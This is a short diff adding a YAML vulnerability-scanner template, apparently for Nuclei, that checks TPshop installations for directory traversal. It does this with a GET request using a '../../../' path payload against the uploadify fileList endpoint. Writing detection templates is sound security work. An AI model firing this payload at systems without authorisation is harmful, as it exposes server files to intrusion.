@@ -1,0 +1,19 @@
+id: tpshop-directory-traversal
+info:
+  author: pikpikcu
+  name: TPshop Directory Traversal
+  reference: https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
+  severity: high
+  tags: tpshop,lfi
+requests:
+- matchers:
+  - type: word
+    words:
+    - '"state":"SUCCESS"'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../'
